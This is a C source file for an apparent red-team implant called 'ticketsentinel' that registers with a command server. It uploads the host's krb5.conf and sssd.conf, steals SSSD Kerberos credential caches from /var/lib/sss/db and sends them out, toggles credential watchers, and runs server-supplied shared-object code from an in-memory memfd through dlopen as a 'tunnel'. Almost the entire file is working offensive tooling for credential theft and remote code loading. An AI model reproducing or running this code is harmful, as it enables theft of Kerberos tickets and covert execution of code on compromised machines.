#define _GNU_SOURCE 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <uuid/uuid.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/types.h>
#include "config.h"
#include "commands.h"
#include "http_transport.h"
#include "file_util.h"

#define DEBUG

#ifdef DEBUG
#define DBG(...) printf(__VA_ARGS__)
#else
#define DBG(...)
#endif


void ticketsentinel_init(ticketsentinel_state_t *state) {
	uuid_t uuid;
	uuid_generate(uuid);
	pthread_mutex_lock(&state->agent_lock);
	uuid_unparse(uuid, state->uuid_agent);
	DBG("[*] UUID Agent: %s\n", state->uuid_agent);
	state->sleep_time = SLEEP_TIME;
	DBG("[*] Default sleep time: %d\n", state->sleep_time);

	// Set watchers as disabled by default
	state->ccache_watcher = false;
	state->keyring_watcher = false;
	state->tunnel_status = false;
	state->tunnel_pid = 1337;
	pthread_mutex_unlock(&state->agent_lock);
}

void register_agent(ticketsentinel_state_t *state){
	char *urlRegist;
        char hostname[HOST_NAME_MAX + 1];
        char *configBufKrb;
        size_t configLenKrb;
        char *configBufSSSD;
        size_t configLenSSSD;
        char *configBuf;
        size_t configLen;
	
	signal(SIGCHLD, SIG_IGN);

        gethostname(hostname, sizeof(hostname));
        asprintf(&urlRegist, "%s%s%s/%s/%d", URL, REGISTER_URI, state->uuid_agent, hostname, state->sleep_time);

        readFileToBuf("/etc/krb5.conf", &configBufKrb, &configLenKrb);
        readFileToBuf("/etc/sssd/sssd.conf", &configBufSSSD, &configLenSSSD);
        configLen = configLenKrb + configLenSSSD;
        configBuf = malloc(configLen);
        memcpy(configBuf, configBufKrb, configLenKrb);
        memcpy(configBuf + configLenKrb, configBufSSSD, configLenSSSD);
        upload_data_request(urlRegist, configBuf, configLen);

        free(configBuf);
        free(urlRegist);

}


int parse_commands(response_buffer_t *contents, ticketsentinel_state_t *state) {
	if (contents->size < 4) {
		return -1;
	}

	uint32_t count;
	memcpy(&count, contents->data, 4);
	count = ntohl(count);

	size_t offset = 4;
	DBG("[*] Number of commands: %u\n", count);

	for (uint32_t i = 0; i < count; i++) {
		if (offset + 24 > contents->size) {
			DBG("[!] Error: buffer too small (header)\n");
			return -2;
		}
		unsigned char uuid[16];
		char uuid_command[37];
		memcpy(uuid, contents->data + offset, 16);
		offset += 16;
		uuid_unparse(uuid, uuid_command);
		DBG("[*] Command UUID: %s\n", uuid_command);
		uint32_t command;
		memcpy(&command, contents->data + offset, 4);
		command = ntohl(command);
		offset += 4;
		DBG("[*] Command code: %u\n", command);
		uint32_t arg_len;
		memcpy(&arg_len, contents->data + offset, 4);
		arg_len = ntohl(arg_len);
		offset += 4;
		if (offset + arg_len > contents->size) {
			DBG("[!] Error: buffer too small (arg)\n");
			return -3;
		}
		char *arg = NULL;
		if (arg_len > 0) {
			arg = malloc(arg_len + 1);
			if (!arg) {
				return -4;
			}
			memcpy(arg, contents->data + offset, arg_len);
			arg[arg_len] = '\0';  
		}
		offset += arg_len;
		DBG("[*] Command arg (%u bytes): %s\n", arg_len, arg ? arg : "(none)");
		switch (command) {
			case 1:
				command_toggle_ccache_watcher(state, uuid_command);
				break;

			case 2:
				command_toggle_keyring_watcher(state, uuid_command);
				break;

			case 11:
				command_extract_sssd_ccache(state, uuid_command);
				break;
			case 12:
				command_open_tunnel(state, uuid_command, arg, arg_len);
				break;
			case 13:
				command_close_tunnel(state, uuid_command);
				break;
			case 14:
				command_status_tunnel(state, uuid_command);
				break;
			case 21:
				char *endptr = NULL;
				unsigned long sleep_time = strtoul(arg, &endptr, 10);
				command_update_sleep(state, uuid_command, (uint32_t)sleep_time);
				break;
			default:
				DBG("[!] Command unknown!\n");
				break;
		}
		if (arg) {
			free(arg);
		}
	}
	
	return 0;
}

void command_toggle_ccache_watcher(ticketsentinel_state_t *state, char* uuid_command) {
	pthread_mutex_lock(&state->agent_lock);
	printf("[*] Command: ccache_watcher_change\n");
	printf("\t[-] Old value: %s\n", state->ccache_watcher ? "true" : "false");
	state->ccache_watcher = !state->ccache_watcher;
	DBG("\t[+] New value: %s\n", state->ccache_watcher ? "true" : "false");
	char *output_value;
	char *watcherURL;
	asprintf(&output_value, "New value: %s\n", state->ccache_watcher ? "ON" : "OFF");
	asprintf(&watcherURL, "%s%s%s/%d", URL, WATCHER_URI, uuid_command, state->ccache_watcher ? 2 : 0);
	upload_data_request(watcherURL, output_value, strlen(output_value));
	free(output_value);
	free(watcherURL);
	pthread_mutex_unlock(&state->agent_lock);

}

void command_toggle_keyring_watcher(ticketsentinel_state_t *state, char* uuid_command) {
        pthread_mutex_lock(&state->agent_lock);
        DBG("[*] Command: keyring_watcher_change\n");
        DBG("\t[-] Old value: %s\n", state->keyring_watcher ? "true" : "false");
        state->keyring_watcher = !state->keyring_watcher;
        DBG("\t[+] New value: %s\n", state->keyring_watcher ? "true" : "false");
        char *output_value;
        char *watcherURL;
        asprintf(&output_value, "New value: %s\n", state->keyring_watcher ? "ON" : "OFF");
        asprintf(&watcherURL, "%s%s%s/%d", URL, WATCHER_URI, uuid_command, state->keyring_watcher ? 2 : 0);
        upload_data_request(watcherURL, output_value, strlen(output_value));
        free(output_value);
        free(watcherURL);
        pthread_mutex_unlock(&state->agent_lock);

}

void command_extract_sssd_ccache(ticketsentinel_state_t *state, char *uuid_command) {
	DBG("[*] Command: sssd_ccache\n");
	DIR *dir;
	struct dirent *entry;
	struct stat st;
	char* output = NULL;
	size_t output_len = 0;

	dir = opendir("/var/lib/sss/db");
	while ((entry = readdir(dir)) != NULL) {
		if (strncmp(entry->d_name, "ccache_", strlen("ccache_")) == 0) {
			char path[4096];
			snprintf(path, sizeof(path), "%s/%s", "/var/lib/sss/db", entry->d_name);
			if (stat(path, &st) == 0 && S_ISREG(st.st_mode)) {
				char* ticketBuf;
                 		size_t ticketLen;
                 		char *urlIngest;
                 		char hostname[HOST_NAME_MAX + 1];
                 		gethostname(hostname, sizeof(hostname));
                 		asprintf(&urlIngest, "%s%s%s/%s/%s", URL, INGEST_URI, state->uuid_agent, hostname, entry->d_name);
                 		if (readFileToBuf(path, &ticketBuf, &ticketLen) == 0){
					response_buffer_t response_watchtower = {0};
                         		send_ticket(urlIngest, entry->d_name, ticketBuf, ticketLen, &response_watchtower);
                                        DBG("[*] Watchtower response: %zu bytes:\n", response_watchtower.size);
                                        //hex_dump((const unsigned char *)response_watchtower.data, response_watchtower.size);
                                        parse_commands(&response_watchtower, state);
                                        free(response_watchtower.data);
                 		}
                 		free(urlIngest);
                 		free(ticketBuf);
				size_t name_len = strlen(entry->d_name);
				char *tmp = realloc(output, output_len + name_len + 2);
				output = tmp;
				memcpy(output + output_len, entry->d_name, name_len);
				output_len += name_len;
				output[output_len++] = '\n';
				output[output_len] = '\0';
			}
		}
	}
	closedir(dir);
	DBG("%s", output);
	char *commandURL;
	char *final_output;
	asprintf(&final_output, "Ccache files found:\n\n%s", output);
	asprintf(&commandURL, "%s%s%s", URL, COMMAND_URI, uuid_command);
	upload_data_request(commandURL, final_output, strlen(final_output));
	free(output);
	free(final_output);
	free(commandURL);
}

void command_update_sleep(ticketsentinel_state_t *state, char* uuid_command, uint32_t sleep_time) {
	pthread_mutex_lock(&state->agent_lock);
	DBG("[*] Update_sleep command\n");
	DBG("\t[-] Old value: %d\n", state->sleep_time);
	state->sleep_time = sleep_time;
	DBG("\t[+] New value: %d\n", state->sleep_time);
	char *commandURL;
	char *final_output;
	asprintf(&final_output, "Sleep time updated to: %d\n", state->sleep_time);
	asprintf(&commandURL, "%s%s%s", URL, COMMAND_URI, uuid_command);
	upload_data_request(commandURL, final_output, strlen(final_output));
	free(final_output);
	free(commandURL);
	pthread_mutex_unlock(&state->agent_lock);
}

void command_status_tunnel(ticketsentinel_state_t *state, char* uuid_command) {
	pthread_mutex_lock(&state->agent_lock);
	DBG("[*] Status_tunnel command\n");
	DBG("\t[+] Status: %s\n", state->tunnel_status ? "true" : "false");
	char *commandURL;
	char *final_output;
	asprintf(&final_output, "Tunnel status: %s\n", state->tunnel_status ? "True" : "False");
	asprintf(&commandURL, "%s%s%s", URL, COMMAND_URI, uuid_command);
        upload_data_request(commandURL, final_output, strlen(final_output));
        free(final_output);
        free(commandURL);
	pthread_mutex_unlock(&state->agent_lock);
}

void command_open_tunnel(ticketsentinel_state_t *state, char* uuid_command, char* tunnel_sc, uint32_t tunnel_len) {
	pthread_mutex_lock(&state->agent_lock);
        DBG("[*] Open_tunnel command\n");
        DBG("\t[+] Current Status: %s\n", state->tunnel_status ? "true" : "false");
	if (state->tunnel_status) {
		DBG("\t[-] Tunnel is open, so need to reopen it\n");
		pthread_mutex_unlock(&state->agent_lock);
		return;
	}
                DBG("\t[+] Tunnel is closed, need to open it\n");
		pid_t pid = fork();
		state->tunnel_pid = pid;
		if (pid == 0) {
			horrible_loader(tunnel_sc, tunnel_len); // Only for public repo, remember to change it with real one in private repo
		}	
		else {
			state->tunnel_status = true;
			pthread_mutex_unlock(&state->agent_lock);
			char *commandURL;
			char *final_output;
			asprintf(&final_output, "Tunnel status: %s\n", state->tunnel_status ? "True" : "False");
			asprintf(&commandURL, "%s%s%s", URL, COMMAND_URI, uuid_command);
			upload_data_request(commandURL, final_output, strlen(final_output));
			free(final_output);
			free(commandURL);
			return;
		}

}

void command_close_tunnel(ticketsentinel_state_t *state, char* uuid_command) {
        pthread_mutex_lock(&state->agent_lock);
        DBG("[*] Close_tunnel command\n");
	state->tunnel_status = false;
        char *commandURL;
        char *final_output;
	kill(state->tunnel_pid, SIGKILL);
        asprintf(&final_output, "Tunnel closed\n");
        asprintf(&commandURL, "%s%s%s", URL, COMMAND_URI, uuid_command);
        upload_data_request(commandURL, final_output, strlen(final_output));
        free(final_output);
        free(commandURL);
        pthread_mutex_unlock(&state->agent_lock);
}


















typedef void (*minorthreat_fn)(void);

void horrible_loader(char *tunnel_sc, uint32_t tunnel_len) {
	int memfd = memfd_create("minorthreat", MFD_CLOEXEC);
        ssize_t off = 0;
	while (off < tunnel_len) {
	    ssize_t n = write(memfd, tunnel_sc + off, tunnel_len - off);
	    off += n;
	}
	char fdpath[64];
	snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", memfd);
	void *handle = dlopen(fdpath, RTLD_NOW);
	minorthreat_fn minorthreat = (minorthreat_fn)dlsym(handle, "MinorThreat");
	minorthreat();
}

